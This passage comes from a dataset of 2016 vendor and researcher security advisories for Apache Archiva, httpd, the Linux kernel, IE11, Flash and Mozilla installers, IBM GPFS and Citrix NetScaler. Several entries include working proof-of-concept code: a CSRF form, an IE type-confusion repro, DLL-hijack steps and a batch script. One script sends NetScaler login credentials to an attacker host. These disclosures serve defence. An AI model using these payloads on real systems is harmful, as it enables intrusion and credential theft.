Upgrade/Migrate to Apache Archiva 2.2.1
8. REPORT TIMELINE
==================
2016-05-31: Discovery of the vulnerability
2016-05-31: Notified vendor via public security mail address
2016-06-06: No response, sent out another notification
2016-06-10: Vendor states that this version is out of support
2016-07-07: Vendor assigns CVE-2016-5005
2016-07-11: Advisory released
9. REFERENCES
=============
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5005"
2732,[RCESEC-2016-003][CVE-2016-4469] Apache Archiva 1.3.9 Multiple Cross-Site Request Forgeries,,CVE-2016-4469,"RCE Security Advisory
https://www.rcesecurity.com
1. ADVISORY INFORMATION
=======================
Product: Apache Archiva
Vendor URL: https://archiva.apache.org
Type: Cross-Site Request Forgery [CWE-253]
Date found: 2016-05-31
Date published: 2016-07-11
CVSSv3 Score: 5.4 (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N)
CVE: CVE-2016-4469
2. CREDITS
==========
This vulnerability was discovered and researched by Julien Ahrens from
RCE Security.
3. VERSIONS AFFECTED
====================
Apache Archiva v1.3.9
older versions may be affected too.
4. INTRODUCTION
===============
Apache Archiva™ is an extensible repository management software that helps
taking care of your own personal or enterprise-wide build artifact
repository. It is the perfect companion for build tools such as Maven,
Continuum, and ANT.
(from the vendor's homepage)
5. VULNERABILITY DETAILS
========================
The application basically offers a Cross-Site Request Forgery protection
using the a Struts-based token called ""token"". While many administrative
functionalities like adding new users are protected on this way, the
following HTTP POST-based functions are missing this token and are
therefore vulnerable to CSRF:
Adding new repository proxy connectors:
/archiva/admin/addProxyConnector_commit.action
Adding new repositories:
/archiva/admin/addRepository_commit.action
Editing existing repositories:
/archiva/admin/editRepository_commit.action
Adding legacy artifact paths:
/archiva/admin/addLegacyArtifactPath_commit.action
Changing the organizational appearance:
/archiva/admin/saveAppearance.action
Uploading new artifacts:
/archiva/upload_submit.action
The following Proof-of-Concept triggers this vulnerability and adds a new
proxy connector called ""CSRF"":
<html>
<body>
<form
action=""http://localhost:8080/archiva/admin/addProxyConnector_commit.action""
method=""POST"">
<input type=""hidden"" name=""pattern"" value="""" />
<input type=""hidden"" name=""connector&#46;order"" value=""0"" />
<input type=""hidden"" name=""connector&#46;proxyId""
value=""&#40;direct&#32;connection&#41;"" />
<input type=""hidden"" name=""connector&#46;sourceRepoId"" value=""CSRF"" />
<input type=""hidden"" name=""connector&#46;targetRepoId""
value=""maven2&#45;repository&#46;dev&#46;java&#46;net"" />
<input type=""hidden""
name=""connector&#46;policies&#91;&apos;propagate&#45;errors&#45;on&#45;update&apos;&#93;""
value=""always"" />
<input type=""hidden""
name=""connector&#46;policies&#91;&apos;cache&#45;failures&apos;&#93;""
value=""no"" />
<input type=""hidden""
name=""connector&#46;policies&#91;&apos;releases&apos;&#93;""
value=""always"" />
<input type=""hidden""
name=""connector&#46;policies&#91;&apos;propagate&#45;errors&apos;&#93;""
value=""stop"" />
<input type=""hidden""
name=""connector&#46;policies&#91;&apos;checksum&apos;&#93;"" value=""fail"" />
<input type=""hidden""
name=""connector&#46;policies&#91;&apos;snapshots&apos;&#93;""
value=""always"" />
<input type=""hidden"" name=""propertyKey"" value="""" />
<input type=""hidden"" name=""propertyValue"" value="""" />
<input type=""hidden"" name=""blackListPattern"" value="""" />
<input type=""hidden"" name=""whiteListPattern"" value="""" />
<input type=""submit"" value=""Submit request"" />
</form>
</body>
</html>
6. RISK
=======
To successfully exploit this vulnerability a user with administrative rights
must be tricked into visiting an arbitrary website while having an
authenticated session in the application.
The vulnerability allows remote attackers to perform sensitive
administrative actions like adding new repository proxy connectors, adding
new repositories, editing existing repositories, adding legacy artifact
paths, changing the organizational appearance or uploading new artifacts in
the authentication context of the targeted user.
7. SOLUTION
===========
Upgrade/Migrate to Apache Archiva 2.2.1
8. REPORT TIMELINE
==================
2016-05-31: Discovery of the vulnerability
2016-05-31: Notified vendor via public security mail address
2016-06-06: No response, sent out another notification
2016-06-10: Vendor states that this version is out of support
2016-06-21: Vendor assigns CVE-2016-4469
2016-07-11: Advisory released
9. REFERENCES
=============
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4469"
2742,CVE-2016-4979: HTTPD webserver - X509 Client certificate based authentication can be bypassed when HTTP/2 is used [vs],,CVE-2016-4979,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Security Advisory - Apache Software Foundation
Apache HTTPD WebServer / httpd.apache.org
X509 Client certificate based authentication can
be bypassed when HTTP/2 is used
CVE-2016-4979 / CVSS 7.5
The Apache HTTPD web server (from 2.4.18-2.4.20) did not validate a X509
client certificate correctly when experimental module for the HTTP/2
protocol is used to access a resource.
The net result is that a resource that should require a valid client certificate
in order to get access can be accessed without that credential.
Background:
- -----------
Apache can control access to resources based on various things; such as
a password, IP address and so on. One of the options, when SSL or TLS is
used, is gating access based on the client having access to a private-key of
a X509 client certificate. These client certificates are typically held on
a chipcard (e.g. the CAC card in the US, national identity, banking cards
or, for example, medical-chip cards in Europe). In some cases they
are 'soft tokens' - i.e. files, often called PKCS#12 files, which are loaded
into the browser or the 'keychain'.
Gating access based on a client certificate is done by adding a line such as
SSLVerifyClient require
to the httpd configuration; along with a list of trusted client certificate
authorities (SSLCACertificateFile).
Version 2.4.17 of the Apache HTTP Server introduced an experimental feature:
mod_http2 for the HTTP/2 protocol (RFC7540, previous versions were known as
Google SPDY).
This module is NOT compiled in by default -and- is not enabled by default,
although some distribution may have chosen to do so.
It is generally needs to be enabled in the 'Protocols' line in httpd by
adding 'h2' and/or 'h2c' to the 'http/1.1' only default.
The default distributions of the Apache Software Foundation do not include
this experimental feature.
Details:
- --------
- From version 2.4.18, upto and including version 2.4.20 the server failed
to take the (failed/absent) client certificate validation into account
when providing access to a resource over HTTP/2. This issue has been fixed
in version 2.4.23 (r1750779).
As a result - a resource thought to be secure and requiring a valid
client certificate - would be accessible without authentication
provided that the mod_http2 was loaded, h2 or h2c activated, that
that the browser used the HTTP/2 protocol and it would do more than
one request over a given connection.
Impact:
- -------
A third party can gain access to resources on the web server without
the requisite credentials.
This can then lead to unauthorised disclosure of information.
Versions affected:
- ------------------
All versions from 2.4.18 to 2.4.20. The issue is fixed in
version 2.4.23 (released 2015-6-5)
Resolution:
- -----------
Upgrade to version 2.4.23 or newer.
Mitigations and work arounds:
- -----------------------------
As a temporary workaround - HTTP/2 can be disabled by changing
the configuration by removing h2 and h2c from the Protocols
line(s) in the configuration file.
The resulting line should read:
Protocols http/1.1
Credits and timeline
- --------------------
The flaw was found and reported by Erki Aring <erki example ee>
from Liewenthal Electronics Ltd on 2016-06-30. The issue was
resolved by Stefan Eissing that same day and incorporated in
the release of 5th of July 2015 (thus avoiding a bank holiday).
Apache would like to thank all involved for their help with this.
Common Vulnerability Scoring (Version 3) and vector
- ---------------------------------------------------
CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/E:F/RL:O/RC:C
CVSS Base Score 7.5
CVSS Temporal Score 7.0
1.05 / : 2339 $
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4
Comment: This message is encrypted and/or signed with PGP (gnu-pg, gpg). Contact dirkx webweaving org if you cannot read it.
iEYEARECAAYFAld7tMsACgkQ/W+IxiHQpxv09QCgwsaUxNZ0wzZGzozI0el0pqYz
fj0AniAprYMTe0NfLTdUpqIavRSEeCbb
=/FBv
-----END PGP SIGNATURE-----"
2754,[CVE-2016-6136] Double-Fetch Vulnerability in Linux-4.6/kernel/auditsc.c,,CVE-2016-6136,"I found this double-fetch vulnerability when I was doing my research on double-fetch issue analysis, and I�d like to make an announcement here.
This was found in Linux kernel file Linux-4.6/kernel/auditsc.c, and crafted user space data change under race condition will make control strings processed as none-control strings, which could mislead the audit subsystem of Linux kernel.
======================================================
1. Affected Versions: Linux Kernel 4.6 and earlier versions.
2. Detailed description in my report to Kernel Bugzilla: https://bugzilla.kernel.org/show_bug.cgi?id=120681
3. Patch: This has been confirmed by the maintainers and patched in the new version: https://github.com/linux-audit/audit-kernel/issues/18
4. CVE: The Common Vulnerabilities and Exposures (CVE) project has assigned the name CVE-2016-6136 to this issue.
Kind regards
Pengfei Wang"
2757,[CVE-2016-6156] Double-Fetch Vulnerability in Linux-4.6/drivers/platform/chrome/cros_ec_dev.c,,CVE-2016-6156,"I found this double-fetch vulnerability when I was doing my research on double-fetch issue analysis, and I�d like to make an announcement here.
This was found in Linux kernel file Linux-4.6/drivers/platform/chrome/cros_ec_dev.c, and crafted user space data change under race condition will lead to buffer overflow.
======================================================
1. Affected Versions: Linux Kernel 4.6 and earlier versions.
2. Detailed description in my report to Kernel Bugzilla: https://bugzilla.kernel.org/show_bug.cgi?id=120131
3. Patch: This has been confirmed by the maintainers and patched in the new version.
4. CVE: The Common Vulnerabilities and Exposures (CVE) project has assigned the name CVE-2016-6156 to this issue.
Kind regards
Pengfei Wang"
2772,[CVE-2016-6130] Double-Fetch Vulnerability in Linux-4.5/drivers/s390/char/sclp_ctl.c,,CVE-2016-6130,"I found this double-fetch vulnerability when I was doing my research on double-fetch issue analysis, and I�d like to make an anouncement here.
This was found in Linux kernel file Linux-4.5/drivers/s390/char/sclp_ctl.c, and crafted user space data change under race condition will lead to consequences like over-boundary access on the kernel buffer, and information leakage.
================================================================================
1. Affected Versions: Linux Kernel 4.5 and earlier versions.
2. Detailed description: Kernel Bugzilla: https://bugzilla.kernel.org/show_bug.cgi?id=116741
3. Patch: This has been confirmed by the maintainers and patched in the new version: https://github.com/torvalds/linux/commit/532c34b5fbf1687df63b3fcd5b2846312ac943c6
4. CVE: The Common Vulnerabilities and Exposures (CVE) project has assigned the name CVE-2016-6130 to this issue.
Kind regards
Pengfei Wang"
2774,[CVE-2016-5728] Double-Fetch Vulnerability in Linux-4.5/drivers/misc/mic/host/mic_virtio.c,,CVE-2016-5728,"I found this double-fetch vulnerability when I was doing my research on double-fetch issue analysis, and I�d like to make an anouncement here.
This was found in Linux kernel file Linux-4.5/drivers/misc/mic/host/mic_virtio.c, and crafted user space data change under race condition will lead to consequences like over-boundary access on the kernel buffer, information leakage or kernel crash.
================================================================================
1. Affected Versions: Linux Kernel 4.5 and earlier versions.
2. Detailed description: Kernel Bugzilla: https://bugzilla.kernel.org/show_bug.cgi?id=116651
3. Patch: This has been confirmed by the maintainers and patched in the new version: https://github.com/torvalds/linux/commit/9bf292bfca94694a721449e3fd752493856710f6
4. CVE: The Common Vulnerabilities and Exposures (CVE) project has assigned the name CVE-2016-5728 to this issue. This is an entry on the CVE list (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5728), which standardizes names for security problems.
Kind regards
Pengfei Wang"
2783,CVE-2016-4463: Apache Xerces-C XML Parser Crashes on Malformed DTD,,CVE-2016-4463,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
CVE-2016-4463: Apache Xerces-C XML Parser Crashes on Malformed DTD
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected: Apache Xerces-C XML Parser library versions
prior to V3.1.4
Description: The Xerces-C XML parser fails to successfully parse a
DTD that is deeply nested, and this causes a stack overflow, which
makes a denial of service attack against many applications possible
by an unauthenticated attacker.
Mitigation: Applications that are using library versions older than
V3.1.4 should upgrade as soon as possible. Distributors of older
versions should apply the patches from this subversion revision:
http://svn.apache.org/viewvc?view=revision&revision=1747619
Note that the nesting limit is currently implemented as a compile-time
constant in order to maintain ABI-compatibility.
In addition, a related enhancement was made to enable applications
to fully disable DTD processing through the use of an environment
variable. Distributors of older versions are urged to incorporate
this patch to enable applications to more fully protect themselves
from future issues if they do not require DTD support. This change
is ABI-compatible and can be found in this subversion revision:
http://svn.apache.org/viewvc?view=revision&revision=1747620
Credit: This issue was reported by Brandon Perry.
References:
http://xerces.apache.org/xerces-c/secadv/CVE-2016-4463.txt
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2
iQIcBAEBCAAGBQJXXqPQAAoJEDeLhFQCJ3liyRwQAI5aUjhKtZtw+51EgNizpuLa
dvfEP27anUXLKwLXt+WIfogW3TLQ4HwyiszanO4YTlwz3qbKO3TJQXdT4kTQx6/k
KhWr7+vsn7pBEPiiC7kj3lH7QHCd+T8/W+Xik/rKDFV1qAAKuoFgYJ31qED8I65z
371Tdm+p2QE4Nh9M7k7LUs+yWu5XdwJIS61L3R/MpEptynuo7Onbp+sjF6OQCZHc
u1KJ3zAlKzP4iwtxKjvoXqOnLgYwjtqC2p7nYBEXOEn4DA4Q/PMrfdYIebjUo/Wy
CeIN5TGJ2aunMkVK0RgxCqjr0sl2cYqY8iegUqp9Iz4+rMpy5ZDLNyyjgbXgSY73
8145xO2tscLs7bLXAXUGbLlOPxnDqVieGlYyHICFnl58I4ekfhwtMmd9d2WOlaVE
7NEPTorFiHI+wdK2yebCLAMaJbL9KJQiJa/4xw9qvpZ4DQ7aein9jq7fklQ62crc
Ff4h4icX4icM1/s1tvcEM1lZw8Td4UyXkwvoEmfZg7dVy4NW+XM/Kn4FUCPRnC9A
XVAabL3K290Mz77YLqUTk733w1q/lFCxgOCJF18/OJef2azMn74QgFbLcBD16i2O
FNxdtPsSRGNsfOGN08Uiwg9RN6uqoZ6Rxwq3hEcAiufYQHFiXldlS26koP2QMk03
gNuHTr22AcR0ZgoW9GYP
=eilz
-----END PGP SIGNATURE-----"
2815,CVE-2016-0199 / MS16-063: MSIE 11 garbage collector attribute type confusion,,CVE-2016-0199,"CVE-2016-0199 / MS16-063: MSIE 11 garbage collector attribute type confusion
============================================================================
This information is available in an easier to read format on my blog at
http://blog.skylined.nl/
With [MS16-063] Microsoft has patched [CVE-2016-0199]: a memory
corruption bug
in the garbage collector of the JavaScript engine used in Internet
Explorer 11.
By exploiting this vulnerability, a website can causes this garbage
collector
to handle some data in memory as if it was an object, when in fact it
contains
data for another type of value, such as a string or number. The garbage
collector code will use this data as a virtual function table (vftable)
in order
to make a virtual function call. An attacker has enough control over
this data
to allow execution of arbitrary code.
Known affected software and attack vectors
------------------------------------------
+ **Microsoft Internet Explorer 11** (all versions before the June 2016
patch)
An attacker would need to get a target user to open a specially crafted
webpage. Disabling JavaScript should prevent an attacker from
triggering the
vulnerable code path.
Repro
-----
I've created two separate html files that can be used to reproduce this
issue
and shows control over a 32-bit vftable pointer in x86 versions of MSIE or a
partial control over a 64-bit vftable pointer in x64 versions.
````HTML
<!DOCTYPE html>
<meta http-equiv=""X-UA-Compatible"" content=""IE=7"">
<zcript>
oElement = document.createElement(""IMG"");
var oAttr = document.createAttribute(""loop"");
oAttr.nodeValue = oElement;
oElement.loop = 0x41424344; // Set original value data to 44 43 42 41
oElement.setAttributeNode(oAttr); // Replace oElement with original
value data
oElement.removeAttributeNode(oAttr);
CollectGarbage(); // Use original value data as address 0x41424344 of
a vftable
</zcript>
````
(I've had to use xcript rather than script because Gmail refused to send it
otherwise, see https://support.google.com/mail/answer/6590 for the reason.)
Description
-----------
When `setAttributeNode` is used to set an attribute of a HTML element,
and the
`Attr` node's `nodeValue` is not a valid value, this `nodeValue` is set
to the
value the attribute had before the call. This can happen for instance
when you
try to set an attribute that must have a string or number value by using an
`Attr` node with a HTML element as its `nodeValue` (as this is not a
string or
number). The HTML element in `nodeValue` is replaced with the string or
number
value the attribute had before the call to `setAttributeNode`.
If the `Attr` node is then removed using `removeAttributeNode` and the
garbage
collector runs, the code appears to assume the nodeValue still contains an
object, rather than the string or number it has been changed into. This
causes
the code to use the data for the string or number value as if it was a C++
object. It attempts to determine a function pointer for a method from the
object's virtual function table before calling this function using the
pointer.
If the previous value is a string, the character data from the string is
used
to calculate the function pointer. If the previous value is a number,
the value
of the number is used. This provides an attacker with a large amount of
control
over the function pointer and may allow execution of arbitrary code.
Scanner
-------
I build a ""scanner"" to analyze this issue and help create two
proof-of-concept
files that show control over the vftable pointer. More details and the
source
for these can be found on my blog at http://blog.skylined.nl.
Cheers,
SkyLined"
2817,[CVE-2016-1014] Escalation of privilege via executable (un)installers of Flash Player,,CVE-2016-1014,"Hi @ll,
the executable (un)installers for Flash Player before version
22.0.0.192 and 18.0.0.360 (both released on 2016-06-15) are
vulnerable to DLL hijacking: they load and execute multiple
Windows system DLLs from their ""application directory"" instead
of Windows' ""system directory"" %SystemRoot%System32.
On Windows 7 and before they also (try to) load PCACli.dll and
API-MS-Win-Downlevel-Shell32-l1-1-0.dll from the PATH:
PCACli.Dll and API-MS-Win-Downlevel-Shell32-l1-1-0.dll are not
present there, these DLLs were first shipped with Windows 8.
On Windows XP and before they additionally try to load DWMAPI.dll,
PropSys.dll, DevRtl.dll and RPCRTRemote.dll from the PATH: these
DLLs were first shipped with Windows Vista.
See <https://cwe.mitre.org/data/definitions/426.html>,
<https://cwe.mitre.org/data/definitions/427.html> and
<https://capec.mitre.org/data/definitions/471.html> for details
about this well-known and well-documented beginner's error!
Due to the application manifest embedded in the executables which
specifies ""requireAdministrator"" the installers are run with
administrative privileges (""protected"" administrators are prompted
for consent, unprivileged standard users are prompted for an
administrator password); execution of the DLLs therefore results
in an escalation of privilege!
Proof of concept/demonstration:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
1. visit (and read) <http://home.arcor.de/skanthak/sentinel.html>,
then download <http://home.arcor.de/skanthak/download/SENTINEL.DLL>
and save it as PCACli.dll, API-MS-Win-Downlevel-Shell32-l1-1-0.dll,
DWMAPI.dll, RPCRTRemote.dll, OLEAcc.dll, PSAPI.dll, SetupAPI.dll,
ClbCatQ.dll, WSock32.dll, WS2_32.dll, HNetCfg.dll, DNSAPI.dll,
IPHlpAPI.dll, RASAPI32.dll, SensAPI.dll, RASAdHlp.dll, RASMan.dll
plus UserEnv.dll, COMRes.dll, WS2Help.dll, TAPI32.dll, RTUtils.dll
SAMLib.dll and WinMM.dll in your ""Downloads"" directory;
2. fetch the (un)installers for Flash Player released before 2016-06-15
from Adobe's web site and save them in your ""Downloads"" directory;
3. run the (un)installers downloaded in step 2 and notice the message
boxes displayed from the DLLs placed in step 1.
PWNED!
JFTR: since the (un)installers are 32-bit programs and (un)install
both the 32-bit and 64-bit versions of Flash Player this POC
works on 64-bit Windows too.
stay tuned
Stefan Kanthak
Timeline:
~~~~~~~~~
2016-03-12 first vulnerability report sent to Adobe
2016-03-13 Adobe acknowledged the receipt
2016-04-06 Adobe informed about the upcoming patch to be released
2016-04-07 and the assignment of CVE-2016-1014
2016-04-17 second vulnerability report sent to Adobe: the ""fixed""
(un)installers are still vulnerable, they just load
some other DLLs now
2016-04-20 Adobe confirmed the second report and announced to fix
the vulnerability in the June update
2016-06-15 Adobe released fixed (un)installers
2016-06-17 report published"
2831,[CVE-2014-1520] NOT FIXED: privilege escalation via Mozilla's executable installers,,CVE-2014-1520,"Hi @ll,
<https://bugzilla.mozilla.org/show_bug.cgi?id=961676> should
have fixed CVE-2014-1520 in Mozilla's executable installers for
Windows ... but does NOT!
JFTR: this type of vulnerability (really: a bloody stupid trivial
beginner's error!) is well-known and well-documented as
<https://cwe.mitre.org/data/definitions/379.html>.
Proof of concept/demonstration:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
0. download ""Firefox Setup Stub 47.0.exe"", ""Firefox Setup 47.0.exe"",
""Firefox Setup 45.2.0esr.exe"" or ""Thunderbird Setup 45.1.1.exe""
and save them in an arbitrary directory;
1. download <http://home.arcor.de/skanthak/download/SHFOLDER.DLL>
plus <http://home.arcor.de/skanthak/download/SENTINEL.EXE> and
save them in an(other) arbitrary directory;
2. start your editor, copy and paste the following 10 lines and
save them as ""POC.CMD"" in the same directory as ""SHFOLDER.DLL""
and ""SENTINEL.EXE"" downloaded in step 1:
:WAIT1
@If Not Exist ""%TEMP%7z*.tmp"" Goto :WAIT1
For /D %%! In (""%TEMP%7z*.tmp"") Do Set foobar=%%!
Copy ""%~dp0shfolder.dll"" ""%foobar%shfolder.dll""
:WAIT2
@If Not Exist ""%foobar%coremaintenanceservice.exe"" Goto :WAIT2
Copy ""%~dp0sentinel.exe"" ""%foobar%coremaintenanceservice.exe""
:WAIT3
@If Not Exist ""%foobar%coremaintenanceservice_installer.exe"" Goto :WAIT3
Copy ""%~dp0sentinel.exe"" ""%foobar%coremaintenanceservice_installer.exe""
3. execute the batch script ""POC.CMD"" created in step 2;
4. execute ""Firefox Setup Stub 47.0.exe"", ""Firefox Setup 47.0.exe"",
""Firefox Setup 45.2.0esr.exe"" or ""Thunderbird Setup 45.1.1.exe""
downloaded in step 0. and proceed as directed: notice the message
boxed displayed from the copies of ""SHFOLDER.DLL"" and ""SENTINEL.EXE""
placed by the batch script started in step 3 in the unsafe TEMP
subdirectory created by Mozilla's vulnerable executable installers!
PWNED!
Mitigation(s):
~~~~~~~~~~~~~~
0. don't use executable installers. DUMP THEM, NOW!
1. see <http://home.arcor.de/skanthak/!execute.html> as well as
<http://home.arcor.de/skanthak/SAFER.html>.
2. stay away from Mozilla's vulnerable installers for their Windows
software (at least until Mozilla starts to develop a sense for
the safety and security of their users).
stay tuned
Stefan Kanthak
Timeline:
~~~~~~~~~
2015-10-25 <https://bugzilla.mozilla.org/show_bug.cgi?id=1218199>
not even an attempt to fix this vulnerability (check but
<https://blog.mozilla.org/blog/2015/10/23/mozilla-launches-open-source-support-program/>)
2016-04-30 <https://bugzilla.mozilla.org/show_bug.cgi?id=1269111>
<https://bugzilla.mozilla.org/show_bug.cgi?id=1269113>
<https://bugzilla.mozilla.org/show_bug.cgi?id=1269122>
<https://bugzilla.mozilla.org/show_bug.cgi?id=1269123>
<https://bugzilla.mozilla.org/show_bug.cgi?id=1269142>
<https://bugzilla.mozilla.org/show_bug.cgi?id=1269144>
not even an attempt to fix this vulnerability (check but
<https://blog.mozilla.org/blog/2016/06/09/help-make-open-source-secure/>)
2016-06-15 deadline expired after 45 days, report published"
2857,[CVE-2016-0392] IBM GPFS / Spectrum Scale Command Injection,,CVE-2016-0392,"###[IBM GPFS / Spectrum Scale Command Injection]###
A command injection vulnerability in GPFS / Spectrum Scale allows attackers to escalate privileges to root
* Product: IBM GPFS / Spectrum Scale
* Severity: High
* CVE Reference: CVE-2016-0392
* Type: Command injection
* Author: John Fitzpatrick (@j0hn__f)
* Date: 2016-06-07
## Description
IBM�s General Parallel File System (GPFS), now known as Spectrum Scale, is affected by a vulnerability that allows an adversary on any system which mounts GPFS to inject commands which are later executed as root.
## Impact
Exploitation of this vulnerability allows any user of a system with a GPFS filesystem mounted to execute commands as root across the GPFS cluster.
## Cause
This is caused by a failure to safely handle arguments supplied to a number of setuid binaries.
## Affected Versions
IBM Spectrum Scale V4.2.0.0 thru V4.2.0.2
IBM Spectrum Scale V4.1.1.0 thru V4.1.1.6
IBM GPFS V4.1.0.0 thru V4.1.0.8
IBM GPFS V3.5.0.0 thru V3.5.0.30
All older IBM GPFS versions no longer supported
## Interim Workaround
IBM have provided patches in order to resolve this issue. It is recommended that these patches (described in the �Solution� section below) are applied. However, if this is not possible some workarounds may also be applied:
Remove the setuid from the files in the /usr/lpp/mmfs/bin directory. These can be identified by running
ls -l /usr/lpp/mmfs/bin | grep r-s
Reset the setuid bit for each such file by issuing this command on each file
chmod u-s file
Once the workaround is applied, a number of commands may no longer work when not invoked by unprivileged users, including:
mmchfileset
mmcrsnapshot
mmdelsnapshot
mmdf
mmedquota
mmgetacl
mmlsdisk
mmlsfileset
mmlsfs
mmlsmgr
mmlspolicy
mmlspool
mmlsquota
mmlssnapshot
mmputacl
mmsnapdir
(These workarounds are taken from the IBM supplied advisory which can be found at: http://www-01.ibm.com/support/docview.wss?uid=isg3T1023763)
If the workarounds would not affect the usability of GPFS within your environment, then MWR recommend applying these workarounds in addition to the IBM supplied patches detailed below.
## Solution
IBM have provided fixes for this issue; however, MWR have not tested the effectiveness of these patches:
For IBM Spectrum Scale V4.2.0.0 thru V4.2.0.2, apply IBM Spectrum Scale V4.2.0.3 available from Fix Central at:
http://www-933.ibm.com/support/fixcentral/swg/selectFixes?parent=Software%2Bdefined%2Bstorage&product=ibm/StorageSoftware/IBM+Spectrum+Scale&release=4.2.0&platform=All&function=all
For IBM Spectrum Scale V4.1.1.0 thru 4.1.1.6 and IBM GPFS V4.1.0.0 thru V4.1.0.8, apply V4.1.1.7 at:
http://www-933.ibm.com/support/fixcentral/swg/selectFixes?parent=Software%2Bdefined%2Bstorage&product=ibm/StorageSoftware/IBM+Spectrum+Scale&release=4.1.1&platform=All&function=all
For IBM GPFS V3.5.0.0 thru V3.5.0.30, apply V3.5.0.31 at:
http://www-933.ibm.com/support/fixcentral/swg/selectFixes?parent=Cluster%2Bsoftware&product=ibm/power/IBM+General+Parallel+File+System&release=3.5.0&platform=All&function=all
For older versions of IBM GPFS, if you have an extended service contract, please contact IBM Service.
(These solutions are taken from the IBM supplied advisory which can be found at: http://www-01.ibm.com/support/docview.wss?uid=isg3T1023763)
## Further Information
The IBM advisory relating to this issue can be found at the following location: http://www-01.ibm.com/support/docview.wss?uid=isg3T1023763
This issue is closely related to a format string issue in GPFS (CVE-2015-0197) found by Florian Grunwo and Felix Wilhelm of ERNW: http://www-01.ibm.com/support/docview.wss?uid=isg3T1022062
Further technical information may be released at a later date when users have had a chance to resolve this issue.
## Detailed Timeline
2016-04-02: Issue reported to vendor
2016-05-31: Patch and vendor advisory released
2016-06-07: MWR advisory released
## Advisory Information
The full MWRLabs maintained advisory can be found here: https://labs.mwrinfosecurity.com/advisories/ibm-gpfs-spectrum-scale-command-injection/"
2909,[CVE-2016-4945] Login Form Hijacking Vulnerability in Citrix NetScaler Gateway,,CVE-2016-4945,"PERSICON Security Advisory
=======================================================================
Title: Login Form Hijacking vulnerability
Product: Citrix Netscaler
Vulnerable Version: 11.0 Build 64.35
Fixed Version: 11.0 Build 66.11
CVE-ID: CVE-2016-4945
Impact: medium
found: 2015-04-07
by: Dr. Daniel Schliebner <dschliebner persicon com>
http://www.persicon.com
=======================================================================
Vendor Description:
-------------------
""Citrix (NASDAQ:CTXS) aims to power a world where people, organizations
and things are securely connected and accessible to make the
extraordinary possible. Its technology makes the world's apps and
data secure and easy to access, empowering people to work anywhere
and at any time. Citrix provides a complete and integrated portfolio
of Workspace-as-a-Service, application delivery, virtualization, mobility,
network delivery and file sharing solutions that enables IT to ensure
critical systems are securely available to users via the cloud or
on-premise and across any device or platform. With annual revenue
in 2015 of $3.28 billion, Citrix solutions are in use by more than
400,000 organizations and over 100 million users globally.""
(https://www.citrix.com/about.html)
Vulnerability Description:
--------------------------
The login page of the Citrix Netscaler Gateway web frontend is
vulnerable to a DOM-based Cross-Site-Scripting (XSS) vulnerability due
to improper sanitization of the content of the ""NSC_TMAC"" cookie.
The vulnerability is located in the file
/vpn/js/gateway_login_form_view.js

in which the the cookie's content is - if set - written to the DOM
via JavaScript. This is done in the following excerpt:
var cookie_action = ns_getcookie(""NSC_TMAC"");
var action_url= '/cgi/login';
if (cookie_action) {
action_url = cookie_action;
UnsetCookie(""NSC_TMAC"");
This vulnerability can be exploited by an unauthorized remote attacker
by forging the destination address of the login formular in order to
receive login credentials of a victim. This can be achieved by for
example using another XSS vulnerability on the companies web page.
Proof of concept:
-----------------
Assume this vulnerability resides on https://my-foobar-company.com/vpn/.
Assume further, an attacker is able to set a cookie on a victims client
via some other attack vector like, e.g., another XSS vulnerability.
The attacker needs to first (e.g. by XSS) execute the following code
on the client:
<script>
document.cookie='NSC_TMAC=https://attack.ers/receive/;' +
' domain=.my-foobar-company.com';
window.location.href='https://my-foobar-company.com/vpn/'
</script>
As a consequence, the Netscaler Gateway login formular has the url
""https://attack.ers/receive/"" as the value in its ""action"" attribute
and hence a victim will sent its credentials to the attackers
host when submitting the formular.
Vulnerable / tested versions:
-----------------------------
Citrix Netscaler 11.0 Build 65.31
Citrix Netscaler 11.0 Build 64.34
Vendor contact timeline:
------------------------
2016-04-11: Contacting vendor through secure citrix com
2015-04-11: Vendor response - issue has now the case ID CASE-6597
and will be forwarded for feedback
2016-04-12: Vendor response - issue will be reviewed
2016-04-25: Vendor response - issue will be fixed
2016-05-24: Vendor response - issue is fixed in the upcoming
release on 26th May
2016-05-26: Vendor response - issue is fixed in the upcoming
release at 5pm PDT on 26th May
2016-05-27: Status update - fix released by vendor
2016-05-27: Coordinated release of the security advisory
Solution:
---------
Remove the use of the cookie content or sanitize its content properly
before writing it to the DOM.
References
----------
[1] http://support.citrix.com/article/CTX213313
URL
---
http://persicon.com/tl_files/advisories/PERSICON-advisory-2016-No-1-citrix.t
xt"
2910,[CVE-2016-3094] Apache Qpid Java Broker denial of service vulnerability,,CVE-2016-3094,"CVE-2016-3094: Apache Qpid Java Broker denial of service vulnerability
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected: Qpid Java Broker versions 6.0.0, 6.0.1, and 6.0.2
Description: A malformed authentication attempt may cause the broker to
terminate. The Qpid Java Broker supports a number of configurable
authentication providers each supporting various SASL mechanisms. Some
mechanisms need (or can be configured to accept) plain-text passwords
being sent to the Broker (using the SASL ""PLAIN"" mechanism). Where the
broker has been configured to allow plain-text passwords for authentication
it is possible for a client to send a malformed authentication attempt which
will lead the broker to terminate due to an uncaught Exception.
Brokers configured to use authentication from the ""PlainPasswordFile"",
""SimpleLDAP"", or ""Base64MD5PasswordFile"" providers are vulnerable if the
""PLAIN"" mechanism is enabled (by default ""PLAIN"" will be disabled on
non-TLS ports, but enabled on TLS connections).
Mitigation: Users should upgrade their Qpid Java Broker to version 6.0.3 or
later. If this is not possible, users can disable the PLAIN mechanism for
their authentication manager on versions 0.32 and later by adding ""PLAIN"" to
the list of disabledMechanisms on their authentication provider object.
Note that the SimpleLDAP authentication provider requires PLAIN and so this
work around does not apply there.
Credit: This issue was discovered by ﻿Alex Szczuczko of Red Hat, Inc.
References: https://issues.apache.org/jira/browse/QPID-7271"
